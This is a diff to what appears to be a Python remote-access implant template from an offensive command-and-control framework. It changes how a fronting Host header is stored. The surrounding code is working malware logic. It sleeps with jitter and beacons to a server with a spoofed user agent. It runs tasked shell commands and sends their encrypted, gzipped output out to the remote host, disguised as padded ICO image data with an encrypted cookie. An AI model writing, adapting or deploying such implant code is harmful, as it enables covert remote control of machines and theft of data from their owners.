@@ -8,7 +8,7 @@ def parse_sleep_time(sleep):
   elif sleep.endswith('h'):
     return int(sleep.strip('h').strip()) * 60 * 60
 
-hh = '%s'
+hh[0] = [%s]
 timer = parse_sleep_time("%s".strip())
 icoimage = [%s]
 urls = [%s]
@@ -95,12 +95,12 @@ while(True):
   if cstr < kd:
     key = "%s"
     uri = "%s"
-    server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
+    server = "%%s/%%s%%s" %% (serverclean[0], random.choice(urls), uri)
     try:
       this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
       time.sleep(this_timer)
       ua='%s'
-      if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
+      if hh[0]: req=urllib2.Request(server,headers={'Host':hh[0],'User-agent':ua})
       else: req=urllib2.Request(server,headers={'User-agent':ua})
       res=urllib2.urlopen(req)
       html = res.read()
@@ -212,13 +212,13 @@ while(True):
               except subprocess.CalledProcessError as exc:
                 returnval = "ErrorCmd: %%s" %% exc.output
 
-            server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
+            server = "%%s/%%s%%s" %% (serverclean[0], random.choice(urls), uri)
             opener = urllib2.build_opener()
             postcookie = encrypt(key, taskId)
             data = base64.b64decode(random.choice(icoimage))
             dataimage = data.ljust(1500, '\x00')
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
-            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            if hh[0]: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh[0],'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             res=urllib2.urlopen(req)
             response = res.read()
